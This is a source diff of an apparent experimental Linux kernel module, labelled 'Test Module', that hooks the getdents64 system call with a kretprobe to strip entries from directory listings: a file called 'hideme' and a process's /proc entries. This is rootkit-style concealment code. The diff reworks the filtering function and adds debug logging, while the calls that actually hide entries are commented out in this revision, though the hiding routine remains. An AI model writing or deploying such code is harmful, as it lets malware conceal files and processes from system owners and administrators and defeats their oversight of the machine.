@@ -12,16 +12,15 @@
 
 /// const file name to hide
 const char* hide_file_name = "hideme";
-const char* hide_pid = "5097";
-const char* hide_pid_path = "/5097/fd";
+const char* hide_pid_path = "/3504/fd";
 
-typedef bool (*entry_filter_t)(struct linux_dirent64*);
+typedef bool (*entry_filter_t)(struct linux_dirent64*, void* data);
 
 /// hide directory entries from result buffer
 /// @buffer is the result buffer to store @refitem linux_dirent64
 /// @size of buffer in bytes
 /// @return new buffer size
-static unsigned long hide_entry(void* buffer, unsigned long size, entry_filter_t entryFilter);
+static unsigned long hide_entry(void* buffer, unsigned long size, entry_filter_t entryFilter, void* data);
 
 
 static struct kretprobe kretp = {
@@ -34,8 +33,9 @@ struct getdent64_arguments {
     unsigned int count;
 };
 
-static bool hide_entry_by_name(struct linux_dirent64* entry){
-    if(strcmp(entry->d_name, hide_file_name) == 0){
+static bool hide_entry_by_name(struct linux_dirent64* entry, void* data){
+    const char* str = data;
+    if(strcmp(entry->d_name, str) == 0){
         return true;
     }
     return false;
@@ -67,25 +67,62 @@ static int handle_post(struct kretprobe_instance *ri, struct pt_regs *regs)
     struct getdent64_arguments* args = (struct getdent64_arguments*) ri->data;
     unsigned long retval = regs_return_value(regs);
 
-    // filter by name
-    unsigned int new_size = hide_entry(args->buffer_ptr, retval, hide_entry_by_name);
-    regs_set_return_value(regs, new_size);
+    pr_info("getdents64 (fd=%d, buffer=%ld, count=%d) = %ld\n", args->fd, args->buffer_ptr, args->count, retval);
 
-    // filter socket
-    char fd_path[256];
+    struct linux_dirent64* current_ent = (struct linux_dirent64* )(args->buffer_ptr);
 
-    struct file* file = files_lookup_fd_raw(current->files, args->fd);
-    struct dentry* dentry = file->f_path.dentry;
-    char* path = dentry_path_raw(dentry, fd_path, 256);
+    pr_info("first name is %s\n", current_ent->d_name);
 
-    struct super_block* sb= file->f_path.mnt->mnt_sb;
+//    unsigned long offset = 0;
+//
+//    if(retval < 200){
+//        // find entry to hide
+//        while(offset < retval){
+//            struct linux_dirent64* current_ent = (struct linux_dirent64* )(args->buffer_ptr + offset);
+//            pr_info("found %s\n", current_ent->d_name);
+//
+////            if(strcmp(current_ent->d_name, hide_file_name) == true){
+////                pr_info("hide %s\n", current_ent->d_name);
+////                break;
+////            }
+//            offset += current_ent->d_reclen;
+//        }
+//    }
 
-    // checking if the vfs is proc
-    if(strcmp(sb->s_id, "proc") == 0){
-        if(strcmp(path, hide_pid_path) == 0){
-            pr_info("found usage in path=%s\n", path);
-        }
-    }
+
+//    // filter by name
+//    unsigned int new_size = hide_entry(args->buffer_ptr, retval, hide_entry_by_name, (void*)hide_file_name);
+//    regs_set_return_value(regs, new_size);
+
+//    // filter socket
+//    char fd_path[256];
+//
+//    struct file* file = files_lookup_fd_raw(current->files, args->fd);
+//    struct dentry* dentry = file->f_path.dentry;
+//    char* path = dentry_path_raw(dentry, fd_path, 256);
+//
+//    struct super_block* sb= file->f_path.mnt->mnt_sb;
+//
+//    // checking if the vfs is proc
+//    if(strcmp(sb->s_id, "proc") == 0){
+//        if(strcmp(path, hide_pid_path) == 0){
+//            pr_info("found usage in path=%s\n", path);
+//
+//            {
+//                unsigned long offset = 0;
+//
+//                // find entry to hide
+//                while(offset < retval){
+//                    struct linux_dirent64* current_ent = (struct linux_dirent64* )(args->buffer_ptr + offset);
+//                    pr_info("name=%s\n", current_ent->d_name);
+//                    offset += current_ent->d_reclen;
+//                }
+//            }
+//
+//            unsigned int new_size2 = hide_entry(args->buffer_ptr, new_size, hide_entry_by_name, "3");
+//            regs_set_return_value(regs, new_size2);
+//        }
+//    }
 
     return 0;
 }
@@ -119,7 +156,7 @@ MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Yarin");
 MODULE_DESCRIPTION("Test Module");
 
-unsigned long hide_entry(void* buffer, unsigned long size, entry_filter_t entryFilter){
+unsigned long hide_entry(void* buffer, unsigned long size, entry_filter_t entryFilter, void* data){
     unsigned long offset = 0;
 
     unsigned long hide_entry_offset = -1;
@@ -128,9 +165,10 @@ unsigned long hide_entry(void* buffer, unsigned long size, entry_filter_t entryF
     // find entry to hide
     while(offset < size){
         struct linux_dirent64* current_ent = (struct linux_dirent64* )(buffer + offset);
-        if(entryFilter(current_ent)){
+        if(entryFilter(current_ent, data) == true){
             hide_entry_offset = offset;
             hide_entry_size = current_ent->d_reclen;
+            pr_info("hiding %s\n", current_ent->d_name);
             break;
         }
         offset += current_ent->d_reclen;
